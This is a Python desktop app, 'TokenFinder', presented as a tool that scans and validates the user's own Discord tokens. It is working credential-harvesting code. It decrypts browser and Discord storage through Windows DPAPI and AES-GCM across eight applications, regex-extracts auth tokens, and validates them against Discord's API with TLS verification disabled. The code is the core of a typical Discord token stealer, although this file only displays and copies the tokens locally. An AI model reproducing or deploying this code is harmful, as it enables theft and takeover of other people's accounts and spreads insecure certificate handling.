import webview
import json
import os
import re
import base64
import ctypes
import ctypes.wintypes
import ssl
import urllib.request

# ── DPAPI decryption (Windows credential store) ───────────────────────────────

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_char))
    ]

def dpapi_decrypt(encrypted_bytes):
    inp = DATA_BLOB(
        len(encrypted_bytes),
        ctypes.cast(ctypes.c_char_p(encrypted_bytes), ctypes.POINTER(ctypes.c_char))
    )
    out = DATA_BLOB()
    ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(inp), None, None, None, None, 0, ctypes.byref(out)
    )
    return ctypes.string_at(out.pbData, out.cbData)

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        raw_key = base64.b64decode(data["os_crypt"]["encrypted_key"])[5:]
        return dpapi_decrypt(raw_key)
    except Exception:
        return None

def aes_gcm_decrypt(key, payload):
    try:
        from Crypto.Cipher import AES
        nonce = payload[3:15]
        ciphertext = payload[15:-16]
        decrypted = AES.new(key, AES.MODE_GCM, nonce).decrypt(ciphertext)
        return decrypted.decode("utf-8", errors="ignore").strip("\x00").strip()
    except Exception:
        return ""

# ── Token extraction ──────────────────────────────────────────────────────────

TOKEN_REGEX = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")

def extract_tokens_from_leveldb(ldb_path, master_key):
    tokens = []
    if not os.path.exists(ldb_path):
        return tokens

    for filename in os.listdir(ldb_path):
        if not filename.endswith((".log", ".ldb")):
            continue
        try:
            raw = open(os.path.join(ldb_path, filename), "rb").read()
        except Exception:
            continue

        if master_key:
            for match in re.finditer(rb"v1[01].{12}.{15,200}", raw):
                token = aes_gcm_decrypt(master_key, match.group(0))
                if TOKEN_REGEX.fullmatch(token) and token not in tokens:
                    tokens.append(token)

        for token in TOKEN_REGEX.findall(raw.decode("utf-8", errors="ignore")):
            if token not in tokens:
                tokens.append(token)

    return tokens

def validate_token(token):
    try:
        request = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) discord/1.0.9163 Chrome/124.0.6367.243 "
                              "Electron/30.4.0 Safari/537.36",
                "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSJ9"
            }
        )
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(request, timeout=5, context=ctx) as response:
            data = json.loads(response.read())
            return data.get("username")
    except Exception:
        return None

APPDATA      = os.getenv("APPDATA", "")
LOCAL_APPDATA = os.getenv("LOCALAPPDATA", "")

SOURCES = [
    ("Discord",        f"{APPDATA}\\discord\\Local State",                             f"{APPDATA}\\discord\\Local Storage\\leveldb"),
    ("Discord Canary", f"{APPDATA}\\discordcanary\\Local State",                       f"{APPDATA}\\discordcanary\\Local Storage\\leveldb"),
    ("Discord PTB",    f"{APPDATA}\\discordptb\\Local State",                          f"{APPDATA}\\discordptb\\Local Storage\\leveldb"),
    ("Chrome",         f"{LOCAL_APPDATA}\\Google\\Chrome\\User Data\\Local State",     f"{LOCAL_APPDATA}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"),
    ("Edge",           f"{LOCAL_APPDATA}\\Microsoft\\Edge\\User Data\\Local State",    f"{LOCAL_APPDATA}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"),
    ("Brave",          f"{LOCAL_APPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\Local State", f"{LOCAL_APPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"),
    ("Opera",          f"{APPDATA}\\Opera Software\\Opera Stable\\Local State",        f"{APPDATA}\\Opera Software\\Opera Stable\\Local Storage\\leveldb"),
    ("Opera GX",       f"{APPDATA}\\Opera Software\\Opera GX Stable\\Local State",     f"{APPDATA}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"),
]

def find_all_tokens():
    results, seen = [], set()
    for source_name, local_state_path, ldb_path in SOURCES:
        master_key = get_master_key(local_state_path) if os.path.exists(local_state_path) else None
        for token in extract_tokens_from_leveldb(ldb_path, master_key):
            if token not in seen:
                seen.add(token)
                results.append({"source": source_name, "token": token})
    return results

# ── Clipboard (no subprocess, no CMD flash) ───────────────────────────────────

def copy_to_clipboard(text):
    CF_UNICODETEXT = 13
    buf  = ctypes.create_unicode_buffer(text)
    size = ctypes.sizeof(buf)
    handle = ctypes.windll.kernel32.GlobalAlloc(0x0002, size)
    ptr    = ctypes.windll.kernel32.GlobalLock(handle)
    ctypes.memmove(ptr, buf, size)
    ctypes.windll.kernel32.GlobalUnlock(handle)
    ctypes.windll.user32.OpenClipboard(0)
    ctypes.windll.user32.EmptyClipboard()
    ctypes.windll.user32.SetClipboardData(CF_UNICODETEXT, handle)
    ctypes.windll.user32.CloseClipboard()

# ── Python ↔ JS bridge ────────────────────────────────────────────────────────

class API:
    def scan(self):
        tokens = find_all_tokens()
        results = []
        for item in tokens:
            username = validate_token(item["token"])
            results.append({
                "source":   item["source"],
                "token":    item["token"],
                "valid":    bool(username),
                "username": username or ""
            })
        return json.dumps(results)

    def copy(self, text):
        copy_to_clipboard(text)

    def minimize(self):
        window.minimize()

    def close(self):
        window.destroy()

# ── UI ────────────────────────────────────────────────────────────────────────

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>TokenFinder</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

:root {
  --bg:       #08080f;
  --bg2:      #0f0f1c;
  --bg3:      #161627;
  --border:   rgba(99,102,241,.18);
  --accent:   #6366f1;
  --accent2:  #818cf8;
  --cyan:     #22d3ee;
  --green:    #4ade80;
  --red:      #f87171;
  --text:     #f1f5f9;
  --muted:    #64748b;
  --radius:   12px;
}

html, body {
  width: 100%; height: 100%; overflow: hidden;
  background: var(--bg);
  font-family: 'Inter', system-ui, sans-serif;
  color: var(--text);
  user-select: none;
}

/* ── Titlebar ── */
#titlebar {
  position: fixed; top: 0; left: 0; right: 0; height: 44px;
  display: flex; align-items: center; padding: 0 14px;
  background: rgba(8,8,15,.9); backdrop-filter: blur(20px);
  border-bottom: 1px solid var(--border);
  -webkit-app-region: drag; z-index: 100;
  gap: 10px;
}
.titlebar-icon {
  width: 22px; height: 22px;
  background: linear-gradient(135deg, var(--accent), var(--cyan));
  border-radius: 6px; display: flex; align-items: center; justify-content: center;
  font-size: 11px; font-weight: 700; color: #fff; flex-shrink: 0;
}
.titlebar-name { font-size: 13px; font-weight: 600; color: var(--text); }
.titlebar-version { font-size: 11px; color: var(--muted); }
.titlebar-controls {
  margin-left: auto; display: flex; gap: 4px;
  -webkit-app-region: no-drag;
}
.ctrl-btn {
  width: 28px; height: 24px; border: none; background: transparent;
  color: var(--muted); font-size: 13px; cursor: pointer;
  border-radius: 6px; transition: background .15s, color .15s;
  display: flex; align-items: center; justify-content: center;
}
.ctrl-btn:hover { background: rgba(255,255,255,.07); color: var(--text); }
.ctrl-btn.close:hover { background: rgba(248,113,113,.2); color: var(--red); }

/* ── Body ── */
#app {
  padding: 60px 20px 20px;
  height: 100vh; display: flex; flex-direction: column;
  gap: 16px; overflow: hidden;
}

/* ── Hero ── */
.hero { text-align: center; padding: 4px 0 0; }
.hero-title {
  font-size: 22px; font-weight: 700; letter-spacing: -.4px;
  background: linear-gradient(135deg, var(--accent2) 0%, var(--cyan) 100%);
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}
.hero-sub { font-size: 12px; color: var(--muted); margin-top: 4px; }

/* ── Scan button ── */
.scan-wrap { display: flex; justify-content: center; }
#scan-btn {
  display: flex; align-items: center; gap: 8px;
  padding: 10px 28px; border: none; border-radius: 10px; cursor: pointer;
  font-size: 13px; font-weight: 600; color: #fff; letter-spacing: .2px;
  background: linear-gradient(135deg, #4f46e5, #6366f1);
  box-shadow: 0 0 24px rgba(99,102,241,.35);
  transition: transform .2s, box-shadow .2s, opacity .2s;
  position: relative; overflow: hidden;
}
#scan-btn::after {
  content: ''; position: absolute; inset: 0;
  background: rgba(255,255,255,.08); border-radius: inherit;
  opacity: 0; transition: opacity .15s;
}
#scan-btn:hover:not(:disabled)::after { opacity: 1; }
#scan-btn:active:not(:disabled) { transform: scale(.97); }
#scan-btn:disabled { opacity: .55; cursor: not-allowed; }

.spinner-ring {
  width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3);
  border-top-color: #fff; border-radius: 50%; display: none;
  animation: spin .7s linear infinite;
}
#scan-btn.loading .btn-icon { display: none; }
#scan-btn.loading .spinner-ring { display: block; }

@keyframes spin { to { transform: rotate(360deg); } }

/* ── Status ── */
#status-bar { font-size: 12px; color: var(--muted); text-align: center; min-height: 18px; }

/* ── Divider ── */
.divider { height: 1px; background: var(--border); }

/* ── Results ── */
#results { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; padding-right: 2px; }
#results::-webkit-scrollbar { width: 3px; }
#results::-webkit-scrollbar-track { background: transparent; }
#results::-webkit-scrollbar-thumb { background: rgba(99,102,241,.3); border-radius: 4px; }

.empty-state {
  flex: 1; display: flex; flex-direction: column;
  align-items: center; justify-content: center; gap: 8px;
  color: var(--muted); font-size: 13px; opacity: 0;
  animation: fadeUp .4s ease forwards;
}
.empty-icon { font-size: 28px; }

/* ── Token card ── */
.card {
  background: var(--bg3); border: 1px solid var(--border);
  border-radius: var(--radius); padding: 14px 16px;
  opacity: 0; animation: fadeUp .35s ease forwards;
  transition: border-color .2s;
}
.card:hover { border-color: rgba(99,102,241,.35); }

@keyframes fadeUp {
  from { opacity: 0; transform: translateY(10px); }
  to   { opacity: 1; transform: translateY(0); }
}

.card-top {
  display: flex; align-items: center;
  justify-content: space-between; margin-bottom: 10px;
}
.source-label {
  display: flex; align-items: center; gap: 6px;
  font-size: 13px; font-weight: 600;
}
.source-dot { width: 7px; height: 7px; border-radius: 50%; }
.badge {
  font-size: 11px; font-weight: 600;
  padding: 3px 10px; border-radius: 20px;
}
.badge-valid {
  background: rgba(74,222,128,.12); color: var(--green);
  border: 1px solid rgba(74,222,128,.25);
}
.badge-invalid {
  background: rgba(248,113,113,.1); color: var(--red);
  border: 1px solid rgba(248,113,113,.2);
}

.token-row { display: flex; align-items: center; gap: 8px; }
.token-display {
  flex: 1; background: rgba(0,0,0,.3); border: 1px solid rgba(255,255,255,.06);
  border-radius: 8px; padding: 7px 12px;
  font-family: 'Consolas', monospace; font-size: 11px;
  color: var(--muted); letter-spacing: .4px;
  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  transition: color .2s;
}
.token-display.revealed { color: #94a3b8; }

.action-btn {
  padding: 6px 12px; border: none; border-radius: 8px; cursor: pointer;
  font-size: 11px; font-weight: 600; transition: all .15s; white-space: nowrap;
  font-family: 'Inter', system-ui, sans-serif;
}
.btn-copy {
  background: rgba(74,222,128,.12); color: var(--green);
  border: 1px solid rgba(74,222,128,.2);
}
.btn-copy:hover { background: rgba(74,222,128,.22); }
.btn-copy.copied {
  background: rgba(74,222,128,.25); color: var(--green);
}
.btn-show {
  background: rgba(99,102,241,.12); color: var(--accent2);
  border: 1px solid rgba(99,102,241,.2);
}
.btn-show:hover { background: rgba(99,102,241,.22); }

/* ── Toast ── */
#toast {
  position: fixed; bottom: 18px; left: 50%;
  transform: translateX(-50%) translateY(70px);
  background: rgba(15,15,28,.95); backdrop-filter: blur(20px);
  border: 1px solid rgba(74,222,128,.3); color: var(--green);
  padding: 9px 18px; border-radius: 10px;
  font-size: 12px; font-weight: 600;
  transition: transform .3s cubic-bezier(.34,1.4,.64,1); z-index: 999;
}
#toast.show { transform: translateX(-50%) translateY(0); }
</style>
</head>
<body>

<div id="titlebar">
  <div class="titlebar-icon">TF</div>
  <span class="titlebar-name">TokenFinder</span>
  <span class="titlebar-version">v2.1</span>
  <div class="titlebar-controls">
    <button class="ctrl-btn" onclick="pywebview.api.minimize()">─</button>
    <button class="ctrl-btn close" onclick="pywebview.api.close()">✕</button>
  </div>
</div>

<div id="app">
  <div class="hero">
    <div class="hero-title">Token Finder</div>
    <div class="hero-sub">Scans and validates your Discord tokens locally</div>
  </div>

  <div class="scan-wrap">
    <button id="scan-btn" onclick="startScan()">
      <span class="btn-icon">◉</span>
      <div class="spinner-ring"></div>
      Scan
    </button>
  </div>

  <div id="status-bar"></div>
  <div class="divider"></div>
  <div id="results"></div>
</div>

<div id="toast">✓ Token copied to clipboard</div>

<script>
const tokenStore = {};
let toastTimer;

const SOURCE_COLORS = {
  'Discord':        '#4ade80',
  'Discord Canary': '#818cf8',
  'Discord PTB':    '#c084fc',
  'Chrome':         '#f87171',
  'Edge':           '#22d3ee',
  'Brave':          '#fb923c',
  'Opera':          '#f87171',
  'Opera GX':       '#c084fc',
};

function startScan() {
  const btn = document.getElementById('scan-btn');
  const results = document.getElementById('results');
  const status = document.getElementById('status-bar');

  results.innerHTML = '';
  status.textContent = '';
  btn.disabled = true;
  btn.classList.add('loading');

  pywebview.api.scan().then(raw => {
    const data = JSON.parse(raw);
    btn.disabled = false;
    btn.classList.remove('loading');

    if (!data.length) {
      results.innerHTML = '<div class="empty-state"><div class="empty-icon">◎</div><span>No tokens found</span></div>';
      return;
    }

    const valid = data.filter(d => d.valid).length;
    status.innerHTML = `<span style="color:#4ade80">${data.length}</span> token${data.length > 1 ? 's' : ''} found &nbsp;·&nbsp; <span style="color:#4ade80">${valid}</span> valid`;

    data.forEach((item, i) => {
      setTimeout(() => renderCard(item), i * 70);
    });
  });
}

function renderCard(item) {
  const id   = 'tk_' + Math.random().toString(36).slice(2, 9);
  tokenStore[id] = item.token;

  const color = SOURCE_COLORS[item.source] || '#64748b';
  const badge = item.valid
    ? `<span class="badge badge-valid">✓ ${item.username}</span>`
    : `<span class="badge badge-invalid">✗ Invalid</span>`;

  const copyBtn = item.valid
    ? `<button class="action-btn btn-copy" id="copy_${id}" onclick="copyToken('${id}')">Copy</button>`
    : '';

  const card = document.createElement('div');
  card.className = 'card';
  card.style.animationDelay = '0ms';
  card.innerHTML = `
    <div class="card-top">
      <div class="source-label">
        <span class="source-dot" style="background:${color}"></span>
        ${item.source}
      </div>
      ${badge}
    </div>
    <div class="token-row">
      <div class="token-display" id="${id}">••••••••••••••••••••••••••••••••</div>
      ${copyBtn}
      <button class="action-btn btn-show" onclick="toggleReveal('${id}')">Show</button>
    </div>
  `;
  document.getElementById('results').appendChild(card);
}

function toggleReveal(id) {
  const el  = document.getElementById(id);
  const btn = el.nextElementSibling?.nextElementSibling || el.nextElementSibling;
  const isRevealed = el.classList.toggle('revealed');
  el.textContent = isRevealed ? tokenStore[id] : '••••••••••••••••••••••••••••••••';
  const showBtn = Array.from(el.parentElement.querySelectorAll('.btn-show'))[0];
  if (showBtn) showBtn.textContent = isRevealed ? 'Hide' : 'Show';
}

function copyToken(id) {
  pywebview.api.copy(tokenStore[id]);
  const btn = document.getElementById('copy_' + id);
  if (btn) {
    btn.textContent = 'Copied!';
    btn.classList.add('copied');
    setTimeout(() => {
      btn.textContent = 'Copy';
      btn.classList.remove('copied');
    }, 2000);
  }
  showToast();
}

function showToast() {
  const t = document.getElementById('toast');
  t.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
}
</script>
</body>
</html>"""

# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    api = API()
    window = webview.create_window(
        "TokenFinder",
        html=HTML,
        js_api=api,
        width=560,
        height=640,
        resizable=False,
        frameless=True,
        background_color="#08080f"
    )
    webview.start(debug=False)
